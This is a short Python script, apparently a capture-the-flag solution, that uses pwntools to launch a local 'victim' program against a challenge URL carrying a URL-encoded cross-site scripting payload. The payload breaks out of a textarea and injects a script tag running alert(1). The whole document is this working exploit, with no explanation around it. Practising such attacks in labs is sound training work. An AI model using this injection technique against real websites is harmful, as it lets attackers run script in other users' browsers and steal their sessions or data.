#!/usr/bin/python3
import sys
import requests
from urllib.parse import quote,urlencode
from pwn import *

url = "http://challenge.localhost/"

context.log_level = 'error'

res = process(['/challenge/victim','http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E'])

res.interactive()
